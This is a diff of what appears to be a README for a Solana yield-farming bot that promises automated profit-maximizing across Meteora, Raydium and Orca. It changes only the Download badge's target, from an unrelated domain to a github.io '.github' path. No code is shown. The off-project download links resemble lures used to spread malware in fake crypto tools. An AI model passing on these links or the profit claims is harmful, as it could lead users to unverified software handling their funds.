@@ -2,7 +2,7 @@
 
 Maximize your DeFi profits across Solana with this smart farming bot. It monitors LP vault APYs, auto-harvests and compounds rewards, and dynamically reallocates capital across top platforms like Meteora, Raydium, and Orca.
 
-[![Download Optimizer](https://img.shields.io/badge/Download-Yield_Farming_Optimizer-blueviolet)](https://seomadjest.com)
+[![Download Optimizer](https://img.shields.io/badge/Download-Yield_Farming_Optimizer-blueviolet)](https://solana-yield-farming-optimizer.github.io/.github)
 
 ---
 
